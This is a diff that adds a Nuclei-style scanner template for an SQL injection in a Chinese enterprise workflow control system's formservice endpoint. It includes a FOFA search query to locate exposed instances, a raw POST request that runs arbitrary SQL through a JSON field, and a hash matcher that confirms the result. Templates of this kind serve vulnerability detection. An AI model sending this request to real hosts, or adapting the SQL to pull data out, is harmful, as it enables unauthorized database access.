@@ -1,0 +1,34 @@
+id: skzy-formservice-sqli
+
+info:
+  name: 时空智友企业流程化管控系统 formservice SQL 注入
+  author: m0be1
+  severity: medium
+  description: 时空智友企业流程化管控系统是使用JAVA开发为企业提供流程化管控的一款系统。时空智友企业流程化管控系统 formservice SQL注入漏洞,攻击者可利用该漏洞获取数据库的敏感信息等
+  
+  reference:
+    - https://
+  metadata: 
+    fofa-query: body="企业流程化管控系统"
+    verified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /formservice?service=workflow.sqlResult HTTP/1.1
+        Host: {{hostname}}
+        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
+        Connection: keep-alive
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Length: 91
+
+        {"params": {"a": "11"}, "sql": "select sys.fn_sqlvarbasetostr(HASHBYTES('MD5','1'))"}
+
+        - |
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body,"c4ca4238a0b923820dcc509a6f75849b")'
